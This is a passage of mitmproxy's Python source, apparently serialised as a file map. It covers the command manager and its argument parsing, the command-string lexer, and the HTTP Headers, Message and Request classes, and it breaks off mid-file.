sig.bind(*args, **kwargs)\n    except TypeError as v:\n        raise exceptions.CommandError(\"command argument mismatch: %s\" % v.args[0])\n\n\ndef typename(t: type) -> str:\n    \"\"\"\n    Translates a type to an explanatory string.\n    \"\"\"\n    if t == inspect._empty:  # type: ignore\n        raise exceptions.CommandError(\"missing type annotation\")\n    to = mitmproxy.types.CommandTypes.get(t, None)\n    if not to:\n        raise exceptions.CommandError(\n            \"unsupported type: %s\" % getattr(t, \"__name__\", t)\n        )\n    return to.display\n\n\ndef _empty_as_none(x: Any) -> Any:\n    if x == inspect.Signature.empty:\n        return None\n    return x\n\n\nclass CommandParameter(NamedTuple):\n    name: str\n    type: type\n    kind: inspect._ParameterKind = inspect.Parameter.POSITIONAL_OR_KEYWORD\n\n    def __str__(self):\n        if self.kind is inspect.Parameter.VAR_POSITIONAL:\n            return f\"*{self.name}\"\n        else:\n            return self.name\n\n\nclass Command:\n    name: str\n    manager: \"CommandManager\"\n    signature: inspect.Signature\n    help: str | None\n\n    def __init__(self, manager: \"CommandManager\", name: str, func: Callable) -> None:\n        self.name = name\n        self.manager = manager\n        self.func = func\n        self.signature = inspect.signature(self.func, eval_str=True)\n\n        if func.__doc__:\n            txt = func.__doc__.strip()\n            self.help = \"\\n\".join(textwrap.wrap(txt))\n        else:\n            self.help = None\n\n        # This fails with a CommandException if types are invalid\n        for name, parameter in self.signature.parameters.items():\n            t = parameter.annotation\n            if not mitmproxy.types.CommandTypes.get(parameter.annotation, None):\n                raise exceptions.CommandError(\n                    f\"Argument {name} has an unknown type {t} in {func}.\"\n                )\n        if self.return_type and not mitmproxy.types.CommandTypes.get(\n            self.return_type, None\n        ):\n            raise exceptions.CommandError(\n                f\"Return type has an unknown type ({self.return_type}) in {func}.\"\n            )\n\n    @property\n    def return_type(self) -> type | None:\n        return _empty_as_none(self.signature.return_annotation)\n\n    @property\n    def parameters(self) -> list[CommandParameter]:\n        \"\"\"Returns a list of CommandParameters.\"\"\"\n        ret = []\n        for name, param in self.signature.parameters.items():\n            ret.append(CommandParameter(name, param.annotation, param.kind))\n        return ret\n\n    def signature_help(self) -> str:\n        params = \" \".join(str(param) for param in self.parameters)\n        if self.return_type:\n            ret = f\" -> {typename(self.return_type)}\"\n        else:\n            ret = \"\"\n        return f\"{self.name} {params}{ret}\"\n\n    def prepare_args(self, args: Sequence[str]) -> inspect.BoundArguments:\n        try:\n            bound_arguments = self.signature.bind(*args)\n        except TypeError:\n            expected = f\"Expected: {str(self.signature.parameters)}\"\n            received = f\"Received: {str(args)}\"\n            raise exceptions.CommandError(\n                f\"Command argument mismatch: \\n    {expected}\\n    {received}\"\n            )\n\n        for name, value in bound_arguments.arguments.items():\n            param = self.signature.parameters[name]\n            convert_to = param.annotation\n            if param.kind == param.VAR_POSITIONAL:\n                bound_arguments.arguments[name] = tuple(\n                    parsearg(self.manager, x, convert_to) for x in value\n                )\n            else:\n                bound_arguments.arguments[name] = parsearg(\n                    self.manager, value, convert_to\n                )\n\n        bound_arguments.apply_defaults()\n\n        return bound_arguments\n\n    def call(self, args: Sequence[str]) -> Any:\n        \"\"\"\n        Call the command with a list of arguments. At this point, all\n        arguments are strings.\n        \"\"\"\n        bound_args = self.prepare_args(args)\n        ret = self.func(*bound_args.args, **bound_args.kwargs)\n        if ret is None and self.return_type is None:\n            return\n        typ = mitmproxy.types.CommandTypes.get(self.return_type)\n        assert typ\n        if not typ.is_valid(self.manager, typ, ret):\n            raise exceptions.CommandError(\n                f\"{self.name} returned unexpected data - expected {typ.display}\"\n            )\n        return ret\n\n\nclass ParseResult(NamedTuple):\n    value: str\n    type: type\n    valid: bool\n\n\nclass CommandManager:\n    commands: dict[str, Command]\n\n    def __init__(self, master):\n        self.master = master\n        self.commands = {}\n\n    def collect_commands(self, addon):\n        for i in dir(addon):\n            if not i.startswith(\"__\"):\n                o = getattr(addon, i)\n                try:\n                    # hasattr is not enough, see https://github.com/mitmproxy/mitmproxy/issues/3794\n                    is_command = isinstance(getattr(o, \"command_name\", None), str)\n                except Exception:\n                    pass  # getattr may raise if o implements __getattr__.\n                else:\n                    if is_command:\n                        try:\n                            self.add(o.command_name, o)\n                        except exceptions.CommandError as e:\n                            logging.warning(\n                                f\"Could not load command {o.command_name}: {e}\"\n                            )\n\n    def add(self, path: str, func: Callable):\n        self.commands[path] = Command(self, path, func)\n\n    @functools.lru_cache(maxsize=128)\n    def parse_partial(\n        self, cmdstr: str\n    ) -> tuple[Sequence[ParseResult], Sequence[CommandParameter]]:\n        \"\"\"\n        Parse a possibly partial command. Return a sequence of ParseResults and a sequence of remainder type help items.\n        \"\"\"\n\n        parts: pyparsing.ParseResults = command_lexer.expr.parseString(\n            cmdstr, parseAll=True\n        )\n\n        parsed: list[ParseResult] = []\n        next_params: list[CommandParameter] = [\n            CommandParameter(\"\", mitmproxy.types.Cmd),\n            CommandParameter(\"\", mitmproxy.types.CmdArgs),\n        ]\n        expected: CommandParameter | None = None\n        for part in parts:\n            if part.isspace():\n                parsed.append(\n                    ParseResult(\n                        value=part,\n                        type=mitmproxy.types.Space,\n                        valid=True,\n                    )\n                )\n                continue\n\n            if expected and expected.kind is inspect.Parameter.VAR_POSITIONAL:\n                assert not next_params\n            elif next_params:\n                expected = next_params.pop(0)\n            else:\n                expected = CommandParameter(\"\", mitmproxy.types.Unknown)\n\n            arg_is_known_command = (\n                expected.type == mitmproxy.types.Cmd and part in self.commands\n            )\n            arg_is_unknown_command = (\n                expected.type == mitmproxy.types.Cmd and part not in self.commands\n            )\n            command_args_following = (\n                next_params and next_params[0].type == mitmproxy.types.CmdArgs\n            )\n            if arg_is_known_command and command_args_following:\n                next_params = self.commands[part].parameters + next_params[1:]\n            if arg_is_unknown_command and command_args_following:\n                next_params.pop(0)\n\n            to = mitmproxy.types.CommandTypes.get(expected.type, None)\n            valid = False\n            if to:\n                try:\n                    to.parse(self, expected.type, part)\n                except ValueError:\n                    valid = False\n                else:\n                    valid = True\n\n            parsed.append(\n                ParseResult(\n                    value=part,\n                    type=expected.type,\n                    valid=valid,\n                )\n            )\n\n        return parsed, next_params\n\n    def call(self, command_name: str, *args: Any) -> Any:\n        \"\"\"\n        Call a command with native arguments. May raise CommandError.\n        \"\"\"\n        if command_name not in self.commands:\n            raise exceptions.CommandError(\"Unknown command: %s\" % command_name)\n        return self.commands[command_name].func(*args)\n\n    def call_strings(self, command_name: str, args: Sequence[str]) -> Any:\n        \"\"\"\n        Call a command using a list of string arguments. May raise CommandError.\n        \"\"\"\n        if command_name not in self.commands:\n            raise exceptions.CommandError(\"Unknown command: %s\" % command_name)\n\n        return self.commands[command_name].call(args)\n\n    def execute(self, cmdstr: str) -> Any:\n        \"\"\"\n        Execute a command string. May raise CommandError.\n        \"\"\"\n        parts, _ = self.parse_partial(cmdstr)\n        if not parts:\n            raise exceptions.CommandError(f\"Invalid command: {cmdstr!r}\")\n        command_name, *args = (\n            unquote(part.value) for part in parts if part.type != mitmproxy.types.Space\n        )\n        return self.call_strings(command_name, args)\n\n    def dump(self, out=sys.stdout) -> None:\n        cmds = list(self.commands.values())\n        cmds.sort(key=lambda x: x.signature_help())\n        for c in cmds:\n            for hl in (c.help or \"\").splitlines():\n                print(\"# \" + hl, file=out)\n            print(c.signature_help(), file=out)\n            print(file=out)\n\n\ndef parsearg(manager: CommandManager, spec: str, argtype: type) -> Any:\n    \"\"\"\n    Convert a string to a argument to the appropriate type.\n    \"\"\"\n    t = mitmproxy.types.CommandTypes.get(argtype, None)\n    if not t:\n        raise exceptions.CommandError(f\"Unsupported argument type: {argtype}\")\n    try:\n        return t.parse(manager, argtype, spec)\n    except ValueError as e:\n        raise exceptions.CommandError(str(e)) from e\n\n\ndef command(name: str | None = None):\n    def decorator(function):\n        @functools.wraps(function)\n        def wrapper(*args, **kwargs):\n            verify_arg_signature(function, args, kwargs)\n            return function(*args, **kwargs)\n\n        wrapper.__dict__[\"command_name\"] = name or function.__name__.replace(\"_\", \".\")\n        return wrapper\n\n    return decorator\n\n\ndef argument(name, type):\n    \"\"\"\n    Set the type of a command argument at runtime. This is useful for more\n    specific types such as mitmproxy.types.Choice, which we cannot annotate\n    directly as mypy does not like that.\n    \"\"\"\n\n    def decorator(f: types.FunctionType) -> types.FunctionType:\n        assert name in f.__annotations__\n        f.__annotations__[name] = type\n        return f\n\n    return decorator\n", "mitmproxy/command_lexer.py": "import re\n\nimport pyparsing\n\n# TODO: There is a lot of work to be done here.\n# The current implementation is written in a way that _any_ input is valid,\n# which does not make sense once things get more complex.\n\nPartialQuotedString = pyparsing.Regex(\n    re.compile(\n        r\"\"\"\n            \"[^\"]*(?:\"|$)  # double-quoted string that ends with double quote or EOF\n            |\n            '[^']*(?:'|$)  # single-quoted string that ends with double quote or EOF\n        \"\"\",\n        re.VERBOSE,\n    )\n)\n\nexpr = pyparsing.ZeroOrMore(\n    PartialQuotedString\n    | pyparsing.Word(\" \\r\\n\\t\")\n    | pyparsing.CharsNotIn(\"\"\"'\" \\r\\n\\t\"\"\")\n).leaveWhitespace()\n\n\ndef quote(val: str) -> str:\n    if val and all(char not in val for char in \"'\\\" \\r\\n\\t\"):\n        return val\n    if '\"' not in val:\n        return f'\"{val}\"'\n    if \"'\" not in val:\n        return f\"'{val}'\"\n    return '\"' + val.replace('\"', r\"\\x22\") + '\"'\n\n\ndef unquote(x: str) -> str:\n    if len(x) > 1 and x[0] in \"'\\\"\" and x[0] == x[-1]:\n        return x[1:-1]\n    else:\n        return x\n", "mitmproxy/http.py": "import binascii\nimport json\nimport os\nimport time\nimport urllib.parse\nimport warnings\nfrom collections.abc import Callable\nfrom collections.abc import Iterable\nfrom collections.abc import Iterator\nfrom collections.abc import Mapping\nfrom collections.abc import Sequence\nfrom dataclasses import dataclass\nfrom dataclasses import fields\nfrom email.utils import formatdate\nfrom email.utils import mktime_tz\nfrom email.utils import parsedate_tz\nfrom typing import Any\nfrom typing import cast\n\nfrom mitmproxy import flow\nfrom mitmproxy.coretypes import multidict\nfrom mitmproxy.coretypes import serializable\nfrom mitmproxy.net import encoding\nfrom mitmproxy.net.http import cookies\nfrom mitmproxy.net.http import multipart\nfrom mitmproxy.net.http import status_codes\nfrom mitmproxy.net.http import url\nfrom mitmproxy.net.http.headers import assemble_content_type\nfrom mitmproxy.net.http.headers import infer_content_encoding\nfrom mitmproxy.net.http.headers import parse_content_type\nfrom mitmproxy.utils import human\nfrom mitmproxy.utils import strutils\nfrom mitmproxy.utils import typecheck\nfrom mitmproxy.utils.strutils import always_bytes\nfrom mitmproxy.utils.strutils import always_str\nfrom mitmproxy.websocket import WebSocketData\n\n\n# While headers _should_ be ASCII, it's not uncommon for certain headers to be utf-8 encoded.\ndef _native(x: bytes) -> str:\n    return x.decode(\"utf-8\", \"surrogateescape\")\n\n\ndef _always_bytes(x: str | bytes) -> bytes:\n    return strutils.always_bytes(x, \"utf-8\", \"surrogateescape\")\n\n\n# This cannot be easily typed with mypy yet, so we just specify MultiDict without concrete types.\nclass Headers(multidict.MultiDict):  # type: ignore\n    \"\"\"\n    Header class which allows both convenient access to individual headers as well as\n    direct access to the underlying raw data. Provides a full dictionary interface.\n\n    Create headers with keyword arguments:\n    >>> h = Headers(host=\"example.com\", content_type=\"application/xml\")\n\n    Headers mostly behave like a normal dict:\n    >>> h[\"Host\"]\n    \"example.com\"\n\n    Headers are case insensitive:\n    >>> h[\"host\"]\n    \"example.com\"\n\n    Headers can also be created from a list of raw (header_name, header_value) byte tuples:\n    >>> h = Headers([\n        (b\"Host\",b\"example.com\"),\n        (b\"Accept\",b\"text/html\"),\n        (b\"accept\",b\"application/xml\")\n    ])\n\n    Multiple headers are folded into a single header as per RFC 7230:\n    >>> h[\"Accept\"]\n    \"text/html, application/xml\"\n\n    Setting a header removes all existing headers with the same name:\n    >>> h[\"Accept\"] = \"application/text\"\n    >>> h[\"Accept\"]\n    \"application/text\"\n\n    `bytes(h)` returns an HTTP/1 header block:\n    >>> print(bytes(h))\n    Host: example.com\n    Accept: application/text\n\n    For full control, the raw header fields can be accessed:\n    >>> h.fields\n\n    Caveats:\n     - For use with the \"Set-Cookie\" and \"Cookie\" headers, either use `Response.cookies` or see `Headers.get_all`.\n    \"\"\"\n\n    def __init__(self, fields: Iterable[tuple[bytes, bytes]] = (), **headers):\n        \"\"\"\n        *Args:*\n         - *fields:* (optional) list of ``(name, value)`` header byte tuples,\n           e.g. ``[(b\"Host\", b\"example.com\")]``. All names and values must be bytes.\n         - *\\\\*\\\\*headers:* Additional headers to set. Will overwrite existing values from `fields`.\n           For convenience, underscores in header names will be transformed to dashes -\n           this behaviour does not extend to other methods.\n\n        If ``**headers`` contains multiple keys that have equal ``.lower()`` representations,\n        the behavior is undefined.\n        \"\"\"\n        super().__init__(fields)\n\n        for key, value in self.fields:\n            if not isinstance(key, bytes) or not isinstance(value, bytes):\n                raise TypeError(\"Header fields must be bytes.\")\n\n        # content_type -> content-type\n        self.update(\n            {\n                _always_bytes(name).replace(b\"_\", b\"-\"): _always_bytes(value)\n                for name, value in headers.items()\n            }\n        )\n\n    fields: tuple[tuple[bytes, bytes], ...]\n\n    @staticmethod\n    def _reduce_values(values) -> str:\n        # Headers can be folded\n        return \", \".join(values)\n\n    @staticmethod\n    def _kconv(key) -> str:\n        # Headers are case-insensitive\n        return key.lower()\n\n    def __bytes__(self) -> bytes:\n        if self.fields:\n            return b\"\\r\\n\".join(b\": \".join(field) for field in self.fields) + b\"\\r\\n\"\n        else:\n            return b\"\"\n\n    def __delitem__(self, key: str | bytes) -> None:\n        key = _always_bytes(key)\n        super().__delitem__(key)\n\n    def __iter__(self) -> Iterator[str]:\n        for x in super().__iter__():\n            yield _native(x)\n\n    def get_all(self, name: str | bytes) -> list[str]:\n        \"\"\"\n        Like `Headers.get`, but does not fold multiple headers into a single one.\n        This is useful for Set-Cookie and Cookie headers, which do not support folding.\n\n        *See also:*\n         - <https://tools.ietf.org/html/rfc7230#section-3.2.2>\n         - <https://datatracker.ietf.org/doc/html/rfc6265#section-5.4>\n         - <https://datatracker.ietf.org/doc/html/rfc7540#section-8.1.2.5>\n        \"\"\"\n        name = _always_bytes(name)\n        return [_native(x) for x in super().get_all(name)]\n\n    def set_all(self, name: str | bytes, values: Iterable[str | bytes]):\n        \"\"\"\n        Explicitly set multiple headers for the given key.\n        See `Headers.get_all`.\n        \"\"\"\n        name = _always_bytes(name)\n        values = [_always_bytes(x) for x in values]\n        return super().set_all(name, values)\n\n    def insert(self, index: int, key: str | bytes, value: str | bytes):\n        key = _always_bytes(key)\n        value = _always_bytes(value)\n        super().insert(index, key, value)\n\n    def items(self, multi=False):\n        if multi:\n            return ((_native(k), _native(v)) for k, v in self.fields)\n        else:\n            return super().items()\n\n\n@dataclass\nclass MessageData(serializable.Serializable):\n    http_version: bytes\n    headers: Headers\n    content: bytes | None\n    trailers: Headers | None\n    timestamp_start: float\n    timestamp_end: float | None\n\n    # noinspection PyUnreachableCode\n    if __debug__:\n\n        def __post_init__(self):\n            for field in fields(self):\n                val = getattr(self, field.name)\n                typecheck.check_option_type(field.name, val, field.type)\n\n    def set_state(self, state):\n        for k, v in state.items():\n            if k in (\"headers\", \"trailers\") and v is not None:\n                v = Headers.from_state(v)\n            setattr(self, k, v)\n\n    def get_state(self):\n        state = vars(self).copy()\n        state[\"headers\"] = state[\"headers\"].get_state()\n        if state[\"trailers\"] is not None:\n            state[\"trailers\"] = state[\"trailers\"].get_state()\n        return state\n\n    @classmethod\n    def from_state(cls, state):\n        state[\"headers\"] = Headers.from_state(state[\"headers\"])\n        if state[\"trailers\"] is not None:\n            state[\"trailers\"] = Headers.from_state(state[\"trailers\"])\n        return cls(**state)\n\n\n@dataclass\nclass RequestData(MessageData):\n    host: str\n    port: int\n    method: bytes\n    scheme: bytes\n    authority: bytes\n    path: bytes\n\n\n@dataclass\nclass ResponseData(MessageData):\n    status_code: int\n    reason: bytes\n\n\nclass Message(serializable.Serializable):\n    \"\"\"Base class for `Request` and `Response`.\"\"\"\n\n    @classmethod\n    def from_state(cls, state):\n        return cls(**state)\n\n    def get_state(self):\n        return self.data.get_state()\n\n    def set_state(self, state):\n        self.data.set_state(state)\n\n    data: MessageData\n    stream: Callable[[bytes], Iterable[bytes] | bytes] | bool = False\n    \"\"\"\n    This attribute controls if the message body should be streamed.\n\n    If `False`, mitmproxy will buffer the entire body before forwarding it to the destination.\n    This makes it possible to perform string replacements on the entire body.\n    If `True`, the message body will not be buffered on the proxy\n    but immediately forwarded instead.\n    Alternatively, a transformation function can be specified, which will be called for each chunk of data.\n    Please note that packet boundaries generally should not be relied upon.\n\n    This attribute must be set in the `requestheaders` or `responseheaders` hook.\n    Setting it in `request` or  `response` is already too late, mitmproxy has buffered the message body already.\n    \"\"\"\n\n    @property\n    def http_version(self) -> str:\n        \"\"\"\n        HTTP version string, for example `HTTP/1.1`.\n        \"\"\"\n        return self.data.http_version.decode(\"utf-8\", \"surrogateescape\")\n\n    @http_version.setter\n    def http_version(self, http_version: str | bytes) -> None:\n        self.data.http_version = strutils.always_bytes(\n            http_version, \"utf-8\", \"surrogateescape\"\n        )\n\n    @property\n    def is_http10(self) -> bool:\n        return self.data.http_version == b\"HTTP/1.0\"\n\n    @property\n    def is_http11(self) -> bool:\n        return self.data.http_version == b\"HTTP/1.1\"\n\n    @property\n    def is_http2(self) -> bool:\n        return self.data.http_version == b\"HTTP/2.0\"\n\n    @property\n    def is_http3(self) -> bool:\n        return self.data.http_version == b\"HTTP/3\"\n\n    @property\n    def headers(self) -> Headers:\n        \"\"\"\n        The HTTP headers.\n        \"\"\"\n        return self.data.headers\n\n    @headers.setter\n    def headers(self, h: Headers) -> None:\n        self.data.headers = h\n\n    @property\n    def trailers(self) -> Headers | None:\n        \"\"\"\n        The [HTTP trailers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Trailer).\n        \"\"\"\n        return self.data.trailers\n\n    @trailers.setter\n    def trailers(self, h: Headers | None) -> None:\n        self.data.trailers = h\n\n    @property\n    def raw_content(self) -> bytes | None:\n        \"\"\"\n        The raw (potentially compressed) HTTP message body.\n\n        In contrast to `Message.content` and `Message.text`, accessing this property never raises.\n\n        *See also:* `Message.content`, `Message.text`\n        \"\"\"\n        return self.data.content\n\n    @raw_content.setter\n    def raw_content(self, content: bytes | None) -> None:\n        self.data.content = content\n\n    @property\n    def content(self) -> bytes | None:\n        \"\"\"\n        The uncompressed HTTP message body as bytes.\n\n        Accessing this attribute may raise a `ValueError` when the HTTP content-encoding is invalid.\n\n        *See also:* `Message.raw_content`, `Message.text`\n        \"\"\"\n        return self.get_content()\n\n    @content.setter\n    def content(self, value: bytes | None) -> None:\n        self.set_content(value)\n\n    @property\n    def text(self) -> str | None:\n        \"\"\"\n        The uncompressed and decoded HTTP message body as text.\n\n        Accessing this attribute may raise a `ValueError` when either content-encoding or charset is invalid.\n\n        *See also:* `Message.raw_content`, `Message.content`\n        \"\"\"\n        return self.get_text()\n\n    @text.setter\n    def text(self, value: str | None) -> None:\n        self.set_text(value)\n\n    def set_content(self, value: bytes | None) -> None:\n        if value is None:\n            self.raw_content = None\n            return\n        if not isinstance(value, bytes):\n            raise TypeError(\n                f\"Message content must be bytes, not {type(value).__name__}. \"\n                \"Please use .text if you want to assign a str.\"\n            )\n        ce = self.headers.get(\"content-encoding\")\n        try:\n            self.raw_content = encoding.encode(value, ce or \"identity\")\n        except ValueError:\n            # So we have an invalid content-encoding?\n            # Let's remove it!\n            del self.headers[\"content-encoding\"]\n            self.raw_content = value\n\n        if \"transfer-encoding\" in self.headers:\n            # https://httpwg.org/specs/rfc7230.html#header.content-length\n            # don't set content-length if a transfer-encoding is provided\n            pass\n        else:\n            self.headers[\"content-length\"] = str(len(self.raw_content))\n\n    def get_content(self, strict: bool = True) -> bytes | None:\n        \"\"\"\n        Similar to `Message.content`, but does not raise if `strict` is `False`.\n        Instead, the compressed message body is returned as-is.\n        \"\"\"\n        if self.raw_content is None:\n            return None\n        ce = self.headers.get(\"content-encoding\")\n        if ce:\n            try:\n                content = encoding.decode(self.raw_content, ce)\n                # A client may illegally specify a byte -> str encoding here (e.g. utf8)\n                if isinstance(content, str):\n                    raise ValueError(f\"Invalid Content-Encoding: {ce}\")\n                return content\n            except ValueError:\n                if strict:\n                    raise\n                return self.raw_content\n        else:\n            return self.raw_content\n\n    def set_text(self, text: str | None) -> None:\n        if text is None:\n            self.content = None\n            return\n        enc = infer_content_encoding(self.headers.get(\"content-type\", \"\"))\n\n        try:\n            self.content = cast(bytes, encoding.encode(text, enc))\n        except ValueError:\n            # Fall back to UTF-8 and update the content-type header.\n            ct = parse_content_type(self.headers.get(\"content-type\", \"\")) or (\n                \"text\",\n                \"plain\",\n                {},\n            )\n            ct[2][\"charset\"] = \"utf-8\"\n            self.headers[\"content-type\"] = assemble_content_type(*ct)\n            enc = \"utf8\"\n            self.content = text.encode(enc, \"surrogateescape\")\n\n    def get_text(self, strict: bool = True) -> str | None:\n        \"\"\"\n        Similar to `Message.text`, but does not raise if `strict` is `False`.\n        Instead, the message body is returned as surrogate-escaped UTF-8.\n        \"\"\"\n        content = self.get_content(strict)\n        if content is None:\n            return None\n        enc = infer_content_encoding(self.headers.get(\"content-type\", \"\"), content)\n        try:\n            return cast(str, encoding.decode(content, enc))\n        except ValueError:\n            if strict:\n                raise\n            return content.decode(\"utf8\", \"surrogateescape\")\n\n    @property\n    def timestamp_start(self) -> float:\n        \"\"\"\n        *Timestamp:* Headers received.\n        \"\"\"\n        return self.data.timestamp_start\n\n    @timestamp_start.setter\n    def timestamp_start(self, timestamp_start: float) -> None:\n        self.data.timestamp_start = timestamp_start\n\n    @property\n    def timestamp_end(self) -> float | None:\n        \"\"\"\n        *Timestamp:* Last byte received.\n        \"\"\"\n        return self.data.timestamp_end\n\n    @timestamp_end.setter\n    def timestamp_end(self, timestamp_end: float | None):\n        self.data.timestamp_end = timestamp_end\n\n    def decode(self, strict: bool = True) -> None:\n        \"\"\"\n        Decodes body based on the current Content-Encoding header, then\n        removes the header. If there is no Content-Encoding header, no\n        action is taken.\n\n        *Raises:*\n         - `ValueError`, when the content-encoding is invalid and strict is True.\n        \"\"\"\n        decoded = self.get_content(strict)\n        self.headers.pop(\"content-encoding\", None)\n        self.content = decoded\n\n    def encode(self, encoding: str) -> None:\n        \"\"\"\n        Encodes body with the given encoding, where e is \"gzip\", \"deflate\", \"identity\", \"br\", or \"zstd\".\n        Any existing content-encodings are overwritten, the content is not decoded beforehand.\n\n        *Raises:*\n         - `ValueError`, when the specified content-encoding is invalid.\n        \"\"\"\n        self.headers[\"content-encoding\"] = encoding\n        self.content = self.raw_content\n        if \"content-encoding\" not in self.headers:\n            raise ValueError(f\"Invalid content encoding {repr(encoding)}\")\n\n    def json(self, **kwargs: Any) -> Any:\n        \"\"\"\n        Returns the JSON encoded content of the response, if any.\n        `**kwargs` are optional arguments that will be\n        passed to `json.loads()`.\n\n        Will raise if the content can not be decoded and then parsed as JSON.\n\n        *Raises:*\n         - `json.decoder.JSONDecodeError` if content is not valid JSON.\n         - `TypeError` if the content is not available, for example because the response\n            has been streamed.\n        \"\"\"\n        content = self.get_content(strict=False)\n        if content is None:\n            raise TypeError(\"Message content is not available.\")\n        else:\n            return json.loads(content, **kwargs)\n\n\nclass Request(Message):\n    \"\"\"\n    An HTTP request.\n    \"\"\"\n\n    data: RequestData\n\n    def __init__(\n        self,\n        host: str,\n        port: int,\n        method: bytes,\n        scheme: bytes,\n        authority: bytes,\n        path: bytes,\n        http_version: bytes,\n        headers: Headers | tuple[tuple[bytes, bytes], ...],\n        content: bytes | None,\n        trailers: Headers | tuple[tuple[bytes, bytes], ...] | None,\n        timestamp_start: float,\n        timestamp_end: float | None,\n    ):\n        # auto-convert invalid types to retain compatibility with older code.\n        if isinstance(host, bytes):\n            host = host.decode(\"idna\", \"strict\")\n        if isinstance(method, str):\n            method = method.encode(\"ascii\", \"strict\")\n        if isinstance(scheme, str):\n            scheme = scheme.encode(\"ascii\", \"strict\")\n        if isinstance(authority, str):\n            authority = authority.encode(\"ascii\", \"strict\")\n        if isinstance(path, str):\n            path = path.encode(\"ascii\", \"strict\")\n        if isinstance(http_version, str):\n            http_version = http_version.encode(\"ascii\", \"strict\")\n\n        if isinstance(content, str):\n            raise ValueError(f\"Content must be bytes, not {type(content).__name__}\")\n        if not isinstance(headers, Headers):\n            headers = Headers(headers)\n        if trailers is not None and not isinstance(trailers, Headers):\n            trailers = Headers(trailers)\n\n        self.data = RequestData(\n            host=host,\n            port=port,\n            method=method,\n            scheme=scheme,\n            authority=authority,\n            path=path,\n            http_version=http_version,\n            headers=headers,\n            content=content,\n            trailers=trailers,\n            timestamp_start=timestamp_start,\n            timestamp_end=timestamp_end,\n        )\n\n    def __repr__(self) -> str:\n        if self.host and self.port:\n            hostport = f\"{self.host}:{self.port}\"\n        else:\n            hostport = \"\"\n        path = self.path or \"\"\n        return f\"Request({self.method} {hostport}{path})\"\n\n    @classmethod\n    def make(\n        cls,\n        method: str,\n        url: str,\n        content: bytes | str = \"\",\n        headers: (\n            Headers | dict[str | bytes, str | bytes] | Iterable[tuple[bytes, bytes]]\n        ) = (),\n    ) -> \"Request\":\n        \"\"\"\n        Simplified API for creating request objects.\n        \"\"\"\n        # Headers can be list or dict, we differentiate here.\n        if isinstance(headers, Headers):\n            pass\n        elif isinstance(headers, dict):\n            headers = Headers(\n                (\n                    always_bytes(k, \"utf-8\", \"surrogateescape\"),\n                    always_bytes(v, \"utf-8\", \"surrogateescape\"),\n                )\n                for k, v in headers.items()\n            )\n        elif isinstance(headers, Iterable):\n            headers = Headers(headers)  # type: ignore\n        else:\n            raise TypeError(\n                \"Expected headers to be an iterable or dict, but is {}.\".format(\n                    type(headers).__name__\n                )\n            )\n\n        req = cls(\n            \"\",\n            0,\n            method.encode(\"utf-8\", \"surrogateescape\"),\n            b\"\",\n            b\"\",\n            b\"\",\n            b\"HTTP/1.1\",\n            headers,\n            b\"\",\n            None,\n            time.time(),\n            time.time(),\n        )\n\n        req.url = url\n        # Assign this manually to update the content-length header.\n        if isinstance(content, bytes):\n            req.content = content\n        elif isinstance(content, str):\n            req.text = content\n        else:\n            raise TypeError(\n                f\"Expected content to be str or bytes, but is {type(content).__name__}.\"\n            )\n\n        return req\n\n    @property\n    def first_line_format(self) -> str:\n        \"\"\"\n        *Read-only:* HTTP request form as defined in [RFC 7230](https://tools.ietf.org/html/rfc7230#section-5.3).\n\n        origin-form and asterisk-form are subsumed as \"relative\".\n        \"\"\"\n        if self.method == \"CONNECT\":\n            return \"authority\"\n        elif self.authority:\n            return \"absolute\"\n        else:\n            return \"relative\"\n\n    @property\n    def method(self) -> str:\n        \"\"\"\n        HTTP request method, e.g. \"GET\".\n        \"\"\"\n        return self.data.method.decode(\"utf-8\", \"surrogateescape\").upper()\n\n    @method.setter\n    def method(self, val: str | bytes) -> None:\n        self.data.method = always_bytes(val, \"utf-8\", \"surrogateescape\")\n\n    @property\n    def scheme(self) -> str:\n        \"\"\"\n        HTTP request scheme, which should be \"http\" or \"https\".\n        \"\"\"\n        return self.data.scheme.decode(\"utf-8\", \"surrogateescape\")\n\n    @scheme.setter\n    def scheme(self, val: str | bytes) -> None:\n        self.data.scheme = always_bytes(val, \"utf-8\", \"surrogateescape\")\n\n    @property\n    def authority(self) -> str:\n        \"\"\"\n        HTTP request authority.\n\n        For HTTP/1, this is the authority portion of the request target\n        (in either absolute-form or authority-form).\n        For origin-form and asterisk-form requests, this property is set to an empty string.\n\n        For HTTP/2, this is the :authority pseudo header.\n\n        *See also:* `Request.host`, `Request.host_header`, `Request.pretty_host`\n        \"\"\"\n        try:\n            return self.data.authority.decode(\"idna\")\n        except UnicodeError:\n            return self.data.authority.decode(\"utf8\", \"surrogateescape\")\n\n    @authority.setter\n    def authority(self, val: str | bytes) -> None:\n        if isinstance(val, str):\n            try:\n                val = val.encode(\"idna\", \"strict\")\n            except UnicodeError:\n                val = val.encode(\"utf8\", \"surrogateescape\")  # type: ignore\n        self.data.authority = val\n\n    @property\n    def host(self) -> str:\n        \"\"\"\n        Target server for this request. This may be parsed from the raw request\n        (e.g. from a ``GET http://example.com/ HTTP/1.1`` request line)\n        or inferred from the proxy mode (e.g. an IP in transparent mode).\n\n        Setting the host attribute also updates the host header and authority information, if present.\n\n        *See also:* `Request.authority`, `Request.host_header`, `Request.pretty_host`\n        \"\"\"\n        return self.data.host\n\n    @host.setter\n    def host(self, val: str | bytes) -> None:\n        self.data.host = always_str(val, \"idna\", \"strict\")\n        self._update_host_and_authority()\n\n    @property\n    def host_header(self) -> str | None:\n        \"\"\"\n        The request's host/authority header.\n\n        This property maps to either ``request.headers[\"Host\"]`` or\n        ``request.authority``, depending on whether it's HTTP/1.x or HTTP/2.0.\n\n        *See also:* `Request.authority`,`Request.host`, `Request.pretty_host`\n        \"\"\"\n        if self.is_http2 or self.is_http3:\n            return self.authority or self.data.headers.get(\"Host\", None)\n        else:\n            return self.data.headers.get(\"Host\", None)\n\n    @host_header.setter\n    def host_header(self, val: None | str | bytes) -> None:\n        if val is None:\n            if self.is_http2 or self.is_http3:\n                self.data.authority = b\"\"\n            self.headers.pop(\"Host\", None)\n        else:\n            if self.is_http2 or self.is_http3:\n                self.authority = val  # type: ignore\n            if not (self.is_http2 or self.is_http3) or \"Host\" in self.headers:\n                # For h2, we only overwrite, but not create, as :authority is the h2 host header.\n                self.headers[\"Host\"] = val\n\n    @property\n    def port(self) -> int:\n        \"\"\"\n        Target port.\n        \"\"\"\n        return self.data.port\n\n    @port.setter\n    def port(self, port: int) -> None:\n        if not isinstance(port, int):\n            raise ValueError(f\"Port must be an integer, not {port!r}.\")\n\n        self.data.port = port\n        